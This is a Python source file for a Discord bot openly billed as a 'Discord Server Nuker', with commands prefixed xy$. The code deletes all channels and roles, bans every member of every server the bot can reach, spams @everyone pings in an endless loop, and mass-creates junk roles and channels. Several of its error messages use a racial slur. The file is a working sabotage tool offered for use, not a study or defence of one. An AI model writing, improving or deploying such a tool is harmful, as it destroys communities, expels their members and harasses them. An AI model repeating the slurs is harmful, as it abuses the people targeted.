import os
import string
from random import *
import discord
import asyncio
import colorama

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import bot
from colorama import Fore

colorama.init()

token = "token" # change token
channels = "test" # edit this when wanting to create more channels
role = "test" # edit this when making new roles
ping = "test" # edit this when pinging everyone
amount = int(1) # for role creation
channelamount = int(1) # for channel creation

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='xy$', case_insensitive=True, intents=intents)
bot.remove_command('help')

print(f'''
          {Fore.CYAN}                  .__          nem#6637        
          {Fore.CYAN}   ___  ______.__.|  |   ____   ____ 
          {Fore.CYAN}   \  \/  <   |  ||  |  /  _ \ /    \ 
          {Fore.CYAN}    >    < \___  ||  |_(  <_> )   |  \ 
          {Fore.CYAN}   /__/\_ \/ ____||____/\____/|___|  /
          {Fore.CYAN}         \/\/                      \/ 

        {Fore.CYAN}         Discord Server Nuker
        {Fore.CYAN}            Prefix: xy$

        {Fore.CYAN}           Nuke: xy$nuke
        {Fore.CYAN}            Ban: xy$ban
        {Fore.CYAN}     Delete roles: xy$roledelete
        {Fore.CYAN}      Ping everyone: xy$pingall
        {Fore.CYAN}       Make roles: xy$newrole
        {Fore.CYAN}   Make channels: xy$channelcreate

        {Fore.CYAN}        SHOUTOUT TO MY GANG:
        {Fore.RED}     Hellsec - chillest man alive
        {Fore.YELLOW}      Cicero - based man
        {Fore.BLUE}    Pro man face - pro man face
        ''')

os.system(f"title [XYLON] A shitty nuker....")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for chan in guild.channels:
                try:
                    await chan.delete()
                except:
                    print("Cant do shit lol")


@bot.command()
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for guild in bot.guilds:
        for mem in guild.members:
            try:
                await mem.ban()
            except:
                print("Cant do shit lol")

@bot.command()
async def roledelete(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for guild in bot.guilds:
        for rol in guild.roles:
            try:
                await rol.delete()
            except:
                print("Cant do shit lol")

@bot.command()
async def pingall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    message = ping
    for guild in bot.guilds:
        while True:
            for chan in guild.channels:
                try:
                    await chan.send(f"@everyone {message}")
                except:
                    print("Nigga, are there even channels and/or available permissions to ping everyone?")

@bot.command()
async def newrole(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    random = role.upper()
    for guild in bot.guilds:
        for i in range(amount):
            try:
                await guild.create_role(name=role,color=discord.Color.gold())
            except:
                print("nigga i cant do shit")

@bot.command()
async def channelcreate(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    random = channels.upper()
    for guild in bot.guilds:
        for i in range(channelamount):
            try:
                await guild.create_text_channel(channels)
            except:
                print("Nigga i cant do shit")

bot.run(token)
